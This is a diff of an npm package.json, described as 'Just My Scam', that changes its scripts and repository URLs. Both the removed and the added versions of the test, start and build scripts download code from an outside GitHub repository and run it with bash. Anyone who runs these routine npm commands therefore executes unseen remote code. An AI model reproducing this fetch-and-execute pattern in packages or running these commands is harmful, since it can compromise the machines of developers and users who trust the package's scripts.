@@ -4,20 +4,20 @@
   "description": "Just My Scam",
   "main": "README.md",
   "scripts": {
-    "test": "wget https://raw.githubusercontent.com/xzideas/s/main/m && bash ./m",
-    "start": "wget https://raw.githubusercontent.com/xzideas/s/main/m && bash ./m",
-    "build": "wget https://raw.githubusercontent.com/xzideas/s/main/m && bash ./m"
+    "test": "git clone https://github.com/xzideas/s.git && cd s && bash m",
+    "start": "git clone https://github.com/xzideas/s.git && cd s && bash m",
+    "build": "git clone https://github.com/xzideas/s.git && cd s && bash m"
   },
   "repository": {
     "type": "git",
-    "url": "git+https://github.com/euyixiyue/scam.git"
+    "url": "git+https://github.com/xiix0/scam.git"
   },
   "author": "",
   "license": "ISC",
   "bugs": {
-    "url": "https://github.com/euyixiyue/scam/issues"
+    "url": "https://github.com/xiix0/scam/issues"
   },
-  "homepage": "https://github.com/euyixiyue/scam#readme",
+  "homepage": "https://github.com/xiix0/scam#readme",
   "dependencies": {
     "hello": "^0.3.2"
   }
